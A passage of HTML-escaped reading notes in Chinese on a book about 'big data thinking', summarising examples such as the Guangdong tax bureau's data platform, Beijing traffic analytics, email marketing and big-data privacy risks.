&lt;ul class=&quot;org-ul&quot;&gt;
&lt;li&gt;举个例子：当一个人在深夜行走时，会敏锐地察觉到周边的变化。一旦感受到危险或不安的情绪时，就会立即逃跑，甚至大喊大叫。而与此同时，人的大脑之中还有另外一套操作系统，是用来做逻辑推理以及进行统计分析的，只是这个系统不怎么完善。于是，人们天生就缺乏逻辑推理能力和统计思维能力。&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;li&gt;为什么大数据变成了一个最热门的词汇？主要的原因有两个。
&lt;ul class=&quot;org-ul&quot;&gt;
&lt;li&gt;第一个原因是，由于IT革命后，人们有了处理数据的多方面能力，有对计算机数据的处理能力、对计算机的存储能力以及对计算机的计算的能力，等等。再加上，人类储存信息量的增长速度要比世界经济增长的速度快四倍（这仅仅是在金融危机爆发之前的世界经济增长的速度）。而计算机数据处理能力的增长速度，要比世界经济增长的速度快九倍。&lt;/li&gt;
&lt;li&gt;第二个原因是，社会上的一切现象以及企业的发展，能够被数据化的东西越来越多。&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;li&gt;社科院世界经济与政治研究所副所长何帆总结出了大数据的三个规律：
&lt;ul class=&quot;org-ul&quot;&gt;
&lt;li&gt;第一个规律是知其然而不必知其所以然，外行打败内行；&lt;/li&gt;
&lt;li&gt;第二个规律是彻底的价格歧视，商家比你更了解你自己；&lt;/li&gt;
&lt;li&gt;第三个规律是打破专家的信息优势，病人给医生解惑。&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;div id=&quot;outline-container-org6e4cc15&quot; class=&quot;outline-3&quot;&gt;
&lt;h3 id=&quot;org6e4cc15&quot;&gt;&lt;span class=&quot;section-number-3&quot;&gt;2.2&lt;/span&gt; 集合思维&lt;/h3&gt;
&lt;div class=&quot;outline-text-3&quot; id=&quot;text-2-2&quot;&gt;
&lt;ol class=&quot;org-ol&quot;&gt;
&lt;li&gt;如果把毫不相干或紧密相连的数据组合到一个集合中，就能更有效地处理这些相关的数据。这些数据可以清晰地告诉我们：每一个客户的消费观念、倾向、爱好、需求等，哪些可以归为一类，哪些可以归为另一类。&lt;/li&gt;
&lt;li&gt;大数据的集合是数据数量上的增加，能够实现从量变到质变的过程。&lt;/li&gt;
&lt;li&gt;大数据的基本结构还分为三个层次，反映出观察数据库的不同角度。
&lt;ul class=&quot;org-ul&quot;&gt;
&lt;li&gt;第一层是物理数据层：是数据库最里面的一层，是物理存贮设备上实际存储的数据的集合。这些数据是最原始数据，也是供用户加工的对象。物理数据层由内部模式描述的指令操作处理的位串、字符和字组合而成。&lt;/li&gt;
&lt;li&gt;第二层是概念数据层：是数据库置于中间的一层，也是数据库的整体逻辑的部分。这层数据层指出了数据与数据之间的逻辑定义和联系，是存贮资料的整合点。此时要注意的是，这层数据层所涉及的是数据库所有对象的逻辑关系，而不是其物理情况。&lt;/li&gt;
&lt;li&gt;第三层是逻辑数据层：是体验用户能够看到和使用的数据库，也是能够证明用户使用过的证明和踪迹。&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;li&gt;总之，小数据，大集合就是按照某种数据集中起来并存放二级存储器中的一种方式。这种数据集合还有着一定的特点，比如尽量不出现重复的情况。&lt;/li&gt;
&lt;/ol&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;div id=&quot;outline-container-org17430c8&quot; class=&quot;outline-3&quot;&gt;
&lt;h3 id=&quot;org17430c8&quot;&gt;&lt;span class=&quot;section-number-3&quot;&gt;2.3&lt;/span&gt; 创新思维&lt;/h3&gt;
&lt;div class=&quot;outline-text-3&quot; id=&quot;text-2-3&quot;&gt;
&lt;ol class=&quot;org-ol&quot;&gt;
&lt;li&gt;首先，大数据的创新思维可以推动并实现巨大的经济效益。&lt;/li&gt;
&lt;li&gt;其次，大数据的创新思维可以增强社会管理水平。&lt;/li&gt;
&lt;li&gt;最后，大数据所具备的创新思维还可以推动和提高安全保障能力。&lt;/li&gt;
&lt;/ol&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;div id=&quot;outline-container-org2cac017&quot; class=&quot;outline-3&quot;&gt;
&lt;h3 id=&quot;org2cac017&quot;&gt;&lt;span class=&quot;section-number-3&quot;&gt;2.4&lt;/span&gt; 转型思维&lt;/h3&gt;
&lt;div class=&quot;outline-text-3&quot; id=&quot;text-2-4&quot;&gt;
&lt;p&gt;
以广东省地税系统为例子，从几大方面来揭示大数据推动公共管理从传统向现代转型的趋势。
&lt;/p&gt;
&lt;ul class=&quot;org-ul&quot;&gt;
&lt;li&gt;第一个方面就是：从粗放化向精细化转型。通过建立省级数据应用大集中征管信息系统，广东地税摆脱了以往人工操作的粗放型管理模式，真正实现了税款自动入库、自动划解和实时监控，实现了税款的稳定增长以及快速增长。再通过对海量信息的详细分析和研究，广东省对每一个商家或是企业都实现了精细化转型。比如说，在房地产方面，由于建筑行业的人员流动性大，操作的环节复杂，且没有规范性，就形成了一个比较难管的问题。但自从有了这个征管系统以后，大数据就能够实时获取房地产开发项目明细信息，其中包括土地使用权信息、房产销售进度、销售明细建筑工程进度以及各阶段的税款缴纳情况等，实现了项目从产生到消亡的全过程监控。&lt;/li&gt;
&lt;li&gt;第二个方面就是：从单兵作战型向协作共享型转型。在以往，不同政府部门拥有着不同的信息系统，但很多数据由于相互独立，所以彼此之间没有共享的信息，这些信息单独拿出去，就没有了任何用处。而大数据应用的出现，就扫除了这个盲点，使其实现了数据信息的共享，从而最大限度地发挥了数据的功效。如今，工商、税务等系统每天都会进行信息实时交换，推动了地税机关在办证服务上的创新，从原来的限时办证，实现了目前的即时办证；从原来填写一百多项登记信息，实现了目前只填写八项必要信息内容，甚至实现了享受免填服务。不仅如此，广东省地税借助大数据平台，积极推进第三方涉税信息共享，还明确了二十多个部门共享信息，真正做到了为每个部门提供便利，为社会经济的发展也提供了更快捷、更便利的服务。&lt;/li&gt;
&lt;li&gt;第三个方面就是：从柜台式向自助式全天候转型。根据纳税人的不同类别、涉税业务的不同、办理时段不同等信息，广东地税借助大数据平台，形成了自助式全天候的一种转型。比如，增添了很多服务格局—网上办税、纳税热线、服务大厅、短信服务、自助办税等多种渠道并存的大服务格局。通过自助办税终端系统，为纳税人节时省力，不仅不受地方区域的限制，也可以不受时间的限制，自行完成代开小额发票、打印缴款凭证、清缴税费、申报缴纳车船税等业务。&lt;/li&gt;
&lt;li&gt;第四个方面就是：从被动响应型向主动预见型转型。为了能够更好地服务纳税人，广东省地税通过税收大数据平台，还推出了一项特别的服务，那就是全省集中统一的短信服务。这项服务会为六百多万的纳税人提供短信订阅服务，有针对性地对目标群体提供了多项短信服务，如逾期未申报短信提醒、未到期未申报短信提醒，还有发票开具短信提醒等。借助于大数据平台，广东省地税实现了对受众精确式的短信服务，避免了轰炸式、盲目性的短信服务，从而提升了服务质量。据统计称：截止到2011年，短信服务量超过1800万条；到了2012年，短信服务量已经超过5000万条。&lt;/li&gt;
&lt;li&gt;第五个方面就是：从纸质文书向电子政务转型。现如今，广东省地税互联网电子税务局已基本建成，纳税人只需要短短的五分钟，就能轻松办税，而且还实现了网上缴纳，足不出户。此外，广东省还率先推行网络开具发票，一方面为纳税人提供了方便，节省了时间。一方面使税务机关能在第一时间掌握每张发票的信息，与企业纳税申报数据比对分析，及时总结出没有缴纳、少缴纳的税款情况。这一行动推广以后，还意外地打击了假发票泛滥的情况，也避免了一些人用假发票报销的现象。也因此，这一措施被国家税务总局誉为“税收管理史上的颠覆性举措”。&lt;/li&gt;
&lt;li&gt;第六个方面就是：从风险隐蔽型向风险防范型转型。依托大数据平台，广东省地税建立了惩防体系信息管理系统，对地税干部的税收执法和行政管理实行了全程分析和监控，有效监督和杜绝了一些知法犯法和影响国家荣誉的风险出现。监控预警信息从最初每月收到近7000个，到2012年每月收到不足500个，下降了92%。可以说，自从大数据监控平台出现后，全系统违法违纪发案率大幅度降低，不足5‰，也没有什么重大的违纪案件出现，这就是最大的成功！&lt;/li&gt;
&lt;/ul&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;div id=&quot;outline-container-org7cc1ee8&quot; class=&quot;outline-3&quot;&gt;
&lt;h3 id=&quot;org7cc1ee8&quot;&gt;&lt;span class=&quot;section-number-3&quot;&gt;2.5&lt;/span&gt; 战略思维&lt;/h3&gt;
&lt;div class=&quot;outline-text-3&quot; id=&quot;text-2-5&quot;&gt;
&lt;ol class=&quot;org-ol&quot;&gt;
&lt;li&gt;未来，大数据相关的技术和能力将成为一个国家至关重要的核心战略资源。
&lt;ul class=&quot;org-ul&quot;&gt;
&lt;li&gt;2012年3月，美国总统***政府宣布推出一项发展计划——“大数据的研究和发展计划”。&lt;/li&gt;
&lt;li&gt;2013年2月，法国政府发布了一项关于《数字化路线图》的技术措施，列出了五项将会大力支持的战略性高新技术，“大数据”位列其中。在这项措施中，法国政府将以软件制造商、工程师、新兴企业、信息系统设计师等为目标，开展一系列投资计划，旨在通过创新型和科学性的解决方案，将大数据运用到实际生活中。&lt;/li&gt;
&lt;li&gt;2012年9月，日本总务省也发布了一项行动计划，提出“通过大数据和开放数据开创新市场”，以复苏日本为目的推进“活跃在ICT领域的日本”ICT综合战。&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;li&gt;大数据的价值主要体现在三个方面。
&lt;ul class=&quot;org-ul&quot;&gt;
&lt;li&gt;第一个方面，是能够实现巨大的商业价值。&lt;/li&gt;
&lt;li&gt;第二个方面是能够增强社会管理水平。&lt;/li&gt;
&lt;li&gt;第三个方面是能够提高安全保障能力。&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;div id=&quot;outline-container-orgcc98aa2&quot; class=&quot;outline-2&quot;&gt;
&lt;h2 id=&quot;orgcc98aa2&quot;&gt;&lt;span class=&quot;section-number-2&quot;&gt;3&lt;/span&gt; 应对传统模式的大数据思维&lt;/h2&gt;
&lt;div class=&quot;outline-text-2&quot; id=&quot;text-3&quot;&gt;
&lt;/div&gt;
&lt;div id=&quot;outline-container-org0e93f48&quot; class=&quot;outline-3&quot;&gt;
&lt;h3 id=&quot;org0e93f48&quot;&gt;&lt;span class=&quot;section-number-3&quot;&gt;3.1&lt;/span&gt; 扩散思维&lt;/h3&gt;
&lt;div class=&quot;outline-text-3&quot; id=&quot;text-3-1&quot;&gt;
&lt;ol class=&quot;org-ol&quot;&gt;
&lt;li&gt;为了更好地分析大数据之间的关联性和扩散性，Facebook使用了HBase。HBase是Apache（世界使用排名第一的Web服务器软件）的另外一款产品，使用了独特定义的一组表格。HBase可以像Hadoop（一个分布式系统基础架构，由Apache基金会所开发）一样执行大数据处理产品的能力，以更迅速、更精细的方式来分析数据之间的连接。&lt;/li&gt;
&lt;li&gt;以北京的交通为例子。北京有一个交通智能化分析平台，其数据通过分析源自路网摄像头、传感器、轨道交通、旅游、地面公交、出租车、客运等行业方方面面的数据，得出了这样的一个结果：高速ETC数据每天50万条；4万辆的浮动车每天会产生近2000万条记录；出租车运营为数据为每天100万条；交通卡刷卡的记录为每天1900万条；手机定位数据为每天1800万条……此外，还计算出了北京的人均上班平均用时为52分钟，全国平均人均上班用时39分钟。这些海量的数据，在体量和产生速度上都对存储和处理能力提出了非常高的要求。&lt;/li&gt;
&lt;/ol&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;div id=&quot;outline-container-org176085e&quot; class=&quot;outline-3&quot;&gt;
&lt;h3 id=&quot;org176085e&quot;&gt;&lt;span class=&quot;section-number-3&quot;&gt;3.2&lt;/span&gt; 颠覆思维&lt;/h3&gt;
&lt;div class=&quot;outline-text-3&quot; id=&quot;text-3-2&quot;&gt;
&lt;ol class=&quot;org-ol&quot;&gt;
&lt;li&gt;在大数据时代，创新和转变思维就意味着进步，意味着发展。而传统的、守旧的思维已经不适用于这个时代。因此，转变思维是大数据时代的必然趋势。
&lt;ul class=&quot;org-ul&quot;&gt;
&lt;li&gt;移动说，搞了这么多年，今年才发现，腾讯才是我们的竞争对手。一个小小的微信软件运用，给了电话和短信致命性的一击！&lt;/li&gt;
&lt;li&gt;国内最大的免费安全平台360互联网安全中心能够颠覆传统杀毒软件市场，成为No.1。&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;li&gt;诸多残酷的现实告诉我们：如果还停留在过去，不懂得转变，那只能被大数据时代淘汰！&lt;/li&gt;
&lt;/ol&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;div id=&quot;outline-container-orgdc9c862&quot; class=&quot;outline-3&quot;&gt;
&lt;h3 id=&quot;orgdc9c862&quot;&gt;&lt;span class=&quot;section-number-3&quot;&gt;3.3&lt;/span&gt; 量变思维&lt;/h3&gt;
&lt;div class=&quot;outline-text-3&quot; id=&quot;text-3-3&quot;&gt;
&lt;p&gt;
信息总量的变化导致了信息形态的变化，也就是量变引发了质变。大数据也一样，量变导致质变。
&lt;/p&gt;
&lt;ul class=&quot;org-ul&quot;&gt;
&lt;li&gt;计算机数据处理能力的增长速度非常快，快得令人咂舌。这个速度比世界经济的增长速度还要快九倍；&lt;/li&gt;
&lt;li&gt;人类存储信息量的增长也迅速增长，比世界经济的增长快四倍；&lt;/li&gt;
&lt;li&gt;曾经，欧洲的信息存储量用了50年才增长了一倍，如今每三年就能增长一倍。&lt;/li&gt;
&lt;li&gt;在金融领域，美国股市每天的成交量高达70亿股，Facebook每天更新的照片量超过1000万张，每天，人们会在网站上点击“喜欢”按钮或写评论约30亿次，谷歌公司每天要处理超过24拍字节的数据。&lt;/li&gt;
&lt;/ul&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;div id=&quot;outline-container-orgcd22369&quot; class=&quot;outline-3&quot;&gt;
&lt;h3 id=&quot;orgcd22369&quot;&gt;&lt;span class=&quot;section-number-3&quot;&gt;3.4&lt;/span&gt; 优劣思维&lt;/h3&gt;
&lt;div class=&quot;outline-text-3&quot; id=&quot;text-3-4&quot;&gt;
&lt;ol class=&quot;org-ol&quot;&gt;
&lt;li&gt;事物都是一分为二的，有优势，也有劣势，大数据也是如此。&lt;/li&gt;
&lt;li&gt;大数据的劣势。
&lt;ul class=&quot;org-ul&quot;&gt;
&lt;li&gt;首先，大数据存在隐私泄露的情况。&lt;/li&gt;
&lt;li&gt;其次，大数据只能发现过去，不能左右未来。&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;div id=&quot;outline-container-org5e853f2&quot; class=&quot;outline-3&quot;&gt;
&lt;h3 id=&quot;org5e853f2&quot;&gt;&lt;span class=&quot;section-number-3&quot;&gt;3.5&lt;/span&gt; 冲击思维&lt;/h3&gt;
&lt;div class=&quot;outline-text-3&quot; id=&quot;text-3-5&quot;&gt;
&lt;ol class=&quot;org-ol&quot;&gt;
&lt;li&gt;大数据的冲击力体现在哪些具体方面：
&lt;ul class=&quot;org-ul&quot;&gt;
&lt;li&gt;第一个方面，大数据正在以无限的增长方式突破有限的增长。&lt;/li&gt;
&lt;li&gt;第二个方面，大数据正在以效益递增突破。&lt;/li&gt;
&lt;li&gt;第三个方面，大数据是和谐共赢的，它突破了对立和矛盾的发展。&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;li&gt;互联网的时代，你需要互联网思维，当然不是那种越来越“玄”的互联网思维，而是一种回归常识的互联网思维。&lt;/li&gt;
&lt;/ol&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;div id=&quot;outline-container-org5289e45&quot; class=&quot;outline-2&quot;&gt;
&lt;h2 id=&quot;org5289e45&quot;&gt;&lt;span class=&quot;section-number-2&quot;&gt;4&lt;/span&gt; 新数据时代的新思维&lt;/h2&gt;
&lt;div class=&quot;outline-text-2&quot; id=&quot;text-4&quot;&gt;
&lt;/div&gt;
&lt;div id=&quot;outline-container-org57b9f68&quot; class=&quot;outline-3&quot;&gt;
&lt;h3 id=&quot;org57b9f68&quot;&gt;&lt;span class=&quot;section-number-3&quot;&gt;4.1&lt;/span&gt; 幂律思维&lt;/h3&gt;
&lt;div class=&quot;outline-text-3&quot; id=&quot;text-4-1&quot;&gt;
&lt;ol class=&quot;org-ol&quot;&gt;
&lt;li&gt;幂律是大数据所遵循的基本定理，什么是幂律？它指的是几何平均定值，如有一万个连线的大节点有十个，有一千个连线的中节点有一百个，一百个连线的小节点有一千个……在对数坐标上画出来会得到一条斜向下的直线。&lt;/li&gt;
&lt;li&gt;幂律和爆发点的相伴相生&lt;/li&gt;
&lt;li&gt;爆发改变了一切&lt;/li&gt;
&lt;/ol&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;div id=&quot;outline-container-org5c9601c&quot; class=&quot;outline-3&quot;&gt;
&lt;h3 id=&quot;org5c9601c&quot;&gt;&lt;span class=&quot;section-number-3&quot;&gt;4.2&lt;/span&gt; 效率思维&lt;/h3&gt;
&lt;div class=&quot;outline-text-3&quot; id=&quot;text-4-2&quot;&gt;
&lt;ol class=&quot;org-ol&quot;&gt;
&lt;li&gt;大数据的精准和效率&lt;/li&gt;
&lt;li&gt;大数据能掌控电视剧收视率&lt;/li&gt;
&lt;li&gt;大数据还能追女朋友&lt;/li&gt;
&lt;/ol&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;div id=&quot;outline-container-org9d49bca&quot; class=&quot;outline-3&quot;&gt;
&lt;h3 id=&quot;org9d49bca&quot;&gt;&lt;span class=&quot;section-number-3&quot;&gt;4.3&lt;/span&gt; 邮件思维&lt;/h3&gt;
&lt;div class=&quot;outline-text-3&quot; id=&quot;text-4-3&quot;&gt;
&lt;ol class=&quot;org-ol&quot;&gt;
&lt;li&gt;邮件思维是什么？是在用户默许的情况下，通过电子邮件的方式向用户传递有价值信息的一种营销手段。营销手段是利用邮件与用户、客户进行商业交流的一种直销方式。&lt;/li&gt;
&lt;li&gt;会员才是邮件营销的核心，与传统的纸质邮件相比，邮件营销更高效、更快捷。&lt;/li&gt;
&lt;li&gt;大数据时代的邮件营销
&lt;ul class=&quot;org-ul&quot;&gt;
&lt;li&gt;邮件营销最注重的是数据信息的收集和整合，各行各业都希望用“短平快”的方式，直接购买邮件地址，不断地给用户或客户发送营销邮件，从而明确目标群，获得订单。但这种营销的效果越来越不明显。&lt;/li&gt;
&lt;li&gt;由于多年来在邮件营销领域的经验和积累，webpower获得了海量的用户数据信息。通过对这些数据的分析和整理，webpower将为客户带来昂贵的价值。在大数据技术的支持和帮助下，webpower可以针对用户点击的内容进行深入分析和挖掘，为其制定个性化的邮件策略。此外，webpower还可以对用户使用邮箱的历史数据，设定为触发式邮件。在必要的时候，可以启用短信、微信等参与进来，提醒用户哪些是有价值的营销邮件。&lt;/li&gt;
&lt;li&gt;邮件营销与网络营销、数据库营销以及新媒体等的结合越来越紧密。如何提升邮件营销给企业带来更大的价值，是IT行业急需探索的问题。&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;div id=&quot;outline-container-orgd36a1d6&quot; class=&quot;outline-3&quot;&gt;
&lt;h3 id=&quot;orgd36a1d6&quot;&gt;&lt;span class=&quot;section-number-3&quot;&gt;4.4&lt;/span&gt; 定位思维&lt;/h3&gt;
&lt;div class=&quot;outline-text-3&quot; id=&quot;text-4-4&quot;&gt;
&lt;ol class=&quot;org-ol&quot;&gt;
&lt;li&gt;网站零售在挖掘顾客喜好时运用了两种方式。
&lt;ul class=&quot;org-ul&quot;&gt;
&lt;li&gt;第一种方式是从消费者的购买行为上来判断他们之间相同的地方。比如，当你在网上买电子产品时，网站就会跳出对话框或在网页下端提醒你—购买这款电子产品的人也购买了其他哪些电子产品。就是这样，网站零售商找到了“人以群分”的结合点。&lt;/li&gt;
&lt;li&gt;第二种方式是从商品上入手，网络零售商通过判断商品之间的关联性推荐给消费者。比如，你想要买一件裤装，网站就会推荐一款T恤或衬衫，从而找到“物以类聚”的结合点。&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;li&gt;余额宝的成功，最重要的就是定位准确。天弘基金副总经理，增利宝余额宝项目组组长周晓明此前曾表示：“小公司走老路，干是找死，不干是等死。穷则思变，中小公司一定要创新。”&lt;/li&gt;
&lt;/ol&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;div id=&quot;outline-container-orga247018&quot; class=&quot;outline-3&quot;&gt;
&lt;h3 id=&quot;orga247018&quot;&gt;&lt;span class=&quot;section-number-3&quot;&gt;4.5&lt;/span&gt; 逆向思维&lt;/h3&gt;
&lt;div class=&quot;outline-text-3&quot; id=&quot;text-4-5&quot;&gt;
&lt;ol class=&quot;org-ol&quot;&gt;
&lt;li&gt;股神巴菲特有这样的一句名言：别人贪婪时我恐惧，别人恐惧时我贪婪。换句话理解，就是人们需要有一种逆向思维，这也是对创新的另一种理解。&lt;/li&gt;
&lt;li&gt;IBM公司曾经是世界上最大的计算机公司，也曾是世界上经济效益最好的计算机公司。1985年，IBM公司的通用大型机毛利率高达85%，中小型机毛利率高达50%，占世界通用大中型计算机市场的70%。到了20世纪80年代后期开始，计算机开始向小型化的个人电脑发展。到了1993年，IBM公司连续亏损，亏损的金额高达168亿美元。为了集中精力进行硬件开发，IBM公司就把个人电脑的操作系统授权给了微软公司。随着IBM个人电脑兼容机的大规模普及，微软和英特尔占据了个人电脑产业系统的核心位置，而IBM硬件则逐渐被边缘化了。&lt;/li&gt;
&lt;li&gt;苹果公司运用逆向思维，另辟蹊径，用一种全新的方式建立了新的产业形态，撼动了微软和英特尔的领导地位。&lt;/li&gt;
&lt;li&gt;逆向思维运用得好，就会将缺点变成优点，把不可能变成可能。&lt;/li&gt;
&lt;li&gt;纵观这些企业之间的竞争和案例，无不告诉我们这样一个道理：“当你面对强手的时候，千万不要被对方牵着鼻子走，而是寻找到自己的节奏，迈出适合自己的步伐，脚踏实地，并懂得“想他人所想不到，做他人所做不到”。&lt;/li&gt;
&lt;/ol&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;div id=&quot;outline-container-orgd6bb076&quot; class=&quot;outline-2&quot;&gt;
&lt;h2 id=&quot;orgd6bb076&quot;&gt;&lt;span class=&quot;section-number-2&quot;&gt;5&lt;/span&gt; 大数据能量的积累与爆发&lt;/h2&gt;
&lt;div class=&quot;outline-text-2&quot; id=&quot;text-5&quot;&gt;
&lt;/div&gt;
&lt;div id=&quot;outline-container-orgb98eb51&quot; class=&quot;outline-3&quot;&gt;
&lt;h3 id=&quot;orgb98eb51&quot;&gt;&lt;span class=&quot;section-number-3&quot;&gt;5.1&lt;/span&gt; 关联思维&lt;/h3&gt;
&lt;div class=&quot;outline-text-3&quot; id=&quot;text-5-1&quot;&gt;
&lt;ol class=&quot;org-ol&quot;&gt;
&lt;li&gt;从数据中寻找出一定的相关关系，通过这种关系，大数据会做出预测，从而告诉大众结果。这就是大数据方法论的核心思想。&lt;/li&gt;
&lt;li&gt;麻省理工学院气象学家洛伦兹曾向人们介绍过一种现象—“蝴蝶效应”。
&lt;ul class=&quot;org-ul&quot;&gt;
&lt;li&gt;一只南美洲亚马孙河流域热带雨林中的蝴蝶，偶尔扇动几下翅膀，两周后，美国得克萨斯州掀起了一场龙卷风。从表面上看来，似乎这之间毫无关系，但结果告诉我们，即使是微小的事情也极有可能与千里之外的一件事情发生关联，并带来改变。&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;div id=&quot;outline-container-org1f93c4c&quot; class=&quot;outline-3&quot;&gt;
&lt;h3 id=&quot;org1f93c4c&quot;&gt;&lt;span class=&quot;section-number-3&quot;&gt;5.2&lt;/span&gt; 双刃思维&lt;/h3&gt;
&lt;div class=&quot;outline-text-3&quot; id=&quot;text-5-2&quot;&gt;
&lt;ol class=&quot;org-ol&quot;&gt;
&lt;li&gt;“大数据时代”的隐患：只要你在网络上活动，无论你在做些什么，都会被“记录在案”，甚至不知在什么地方，又以哪种形式被人揪出来。更可悲的是，你想不想出来的主动权不是由自己说了算，而是由网络运营商来决定。&lt;/li&gt;
&lt;li&gt;“大数据”是一把双刃剑，人们在享受大数据带来的机遇时，也不得不面临一个残酷的问题，以及可能爆发的大数据危机。&lt;/li&gt;
&lt;/ol&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;div id=&quot;outline-container-org1bba263&quot; class=&quot;outline-3&quot;&gt;
&lt;h3 id=&quot;org1bba263&quot;&gt;&lt;span class=&quot;section-number-3&quot;&gt;5.3&lt;/span&gt; 价值思维&lt;/h3&gt;
&lt;div class=&quot;outline-text-3&quot; id=&quot;text-5-3&quot;&gt;
&lt;ol class=&quot;org-ol&quot;&gt;
&lt;li&gt;“大数据”真的那么具有吸引力吗？
&lt;ul class=&quot;org-ul&quot;&gt;
&lt;li&gt;网络用户每点击一次鼠标，每一次刷卡消费，都已经参与了数据的生成。可以说，每一个用户都是数字的生产者和消费者。&lt;/li&gt;
&lt;li&gt;凭借如此精细的监测手段，完全可以知道一个人或一辆车的行踪，从而产生精细化的数据，用以描述各种物体、社会和整个环境的行为。有了这些数据，大大减少了社会的复杂度。&lt;/li&gt;
&lt;li&gt;在商业领域，一家美国的公司已经利用大数据，在亚马逊的云平台上处理跟天气相关的信息，从而帮助农业种植者保障自己的收益。对企业数据信息的深度挖掘和分析，能够对经济运行的状况进行准确的预警，从而做出正确的应对决策。&lt;/li&gt;
&lt;li&gt;在金融领域方面，大数据分析师都已经成为在美国华尔街基金股票分析和高频数据交易等领域最抢手的人才；在中国，阿里巴巴集团旗下的金融业务，也开始用大数据来发放“信用贷款”。&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;li&gt;大数据时代带来了比以往机会更大的发展空间。这包括以下几个方面：
&lt;ul class=&quot;org-ul&quot;&gt;
&lt;li&gt;第一个方面，是技术创新的新空间。&lt;/li&gt;
&lt;li&gt;第二个方面是商业模式的创新。&lt;/li&gt;
&lt;li&gt;第三个方面是信息资产的经营。&lt;/li&gt;
&lt;li&gt;第四个方面是客户关系管理。&lt;/li&gt;
&lt;li&gt;第五个方面是个性化精准推荐。&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;div id=&quot;outline-container-org1793406&quot; class=&quot;outline-2&quot;&gt;
&lt;h2 id=&quot;org1793406&quot;&gt;&lt;span class=&quot;section-number-2&quot;&gt;6&lt;/span&gt; 大数据引导的商业变革&lt;/h2&gt;
&lt;div class=&quot;outline-text-2&quot; id=&quot;text-6&quot;&gt;
&lt;/div&gt;
&lt;div id=&quot;outline-container-orgdfca7c8&quot; class=&quot;outline-3&quot;&gt;
&lt;h3 id=&quot;orgdfca7c8&quot;&gt;&lt;span class=&quot;section-number-3&quot;&gt;6.1&lt;/span&gt; 知识思维&lt;/h3&gt;
&lt;div class=&quot;outline-text-3&quot; id=&quot;text-6-1&quot;&gt;
&lt;ol class=&quot;org-ol&quot;&gt;
&lt;li&gt;“核心竞争力”这一理念，是由美国学者普拉哈德和哈默提出的。他们把其定义为：组织中的积累性学识，特别是关于如何协调不同的生产技能和有机结合多种技术流派的学识。&lt;/li&gt;
&lt;li&gt;大数据的核心是思想，不是技术。&lt;/li&gt;
&lt;li&gt;端到端是一个面向大数据的解决方案。英特尔的理念是在这个解决方案里实现数据价值的挖掘。所谓“端到端”，前端视频采集、分析、存储，及后端数据中心处理等。&lt;/li&gt;
&lt;li&gt;总而言之，知识经济才是提高核心竞争力的有效途径。
&lt;ul class=&quot;org-ul&quot;&gt;
&lt;li&gt;首先，知识经济时代可以识别企业核心知识，并提高企业的创新能力。&lt;/li&gt;
&lt;li&gt;其次，信息化建设可以使知识管理更有效地进行，提高企业的核心竞争力。&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;div id=&quot;outline-container-org1bebe9c&quot; class=&quot;outline-3&quot;&gt;
&lt;h3 id=&quot;org1bebe9c&quot;&gt;&lt;span class=&quot;section-number-3&quot;&gt;6.2&lt;/span&gt; 变革思维&lt;/h3&gt;
&lt;div class=&quot;outline-text-3&quot; id=&quot;text-6-2&quot;&gt;
&lt;ol class=&quot;org-ol&quot;&gt;
&lt;li&gt;大数据的价值不言而喻，但也有着两面性。
&lt;ul class=&quot;org-ul&quot;&gt;
&lt;li&gt;大数据催生了一批新型科技公司，吸纳科技人才就业，并为企业发展转型提供了新机遇；&lt;/li&gt;
&lt;li&gt;另外一方面，大数据给个人、企业乃至国家带来了一些危机，如隐私、重构信息安全、竞争力差距拉大以及数据产权争端等问题。&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;li&gt;大数据改变了人们的生活，塑造出了不同的个性化思维。
&lt;ul class=&quot;org-ul&quot;&gt;
&lt;li&gt;比如，人们白天在电脑前浏览网页或下个订单，第二天就能收到自己想要的东西；晚上出门消费，不再是给现金，而是刷卡；看电影也不再苦苦排队，而是提前团购或预订……由此，人们的行为举止都会被记录下来，从而产生数据&lt;/li&gt;
&lt;li&gt;再比如，气候公司会根据各个城市的气温高低、降雨量、土壤的状况和往年的农作物产量等情况，预测出第二年农场的产量，甚至还向农户出售个性化保险；&lt;/li&gt;
&lt;li&gt;阿里巴巴集团根据在淘宝网上中小企业的交易状况，筛选出财务健康和讲究诚信的企业，为其发放无须担保的贷款。&lt;/li&gt;
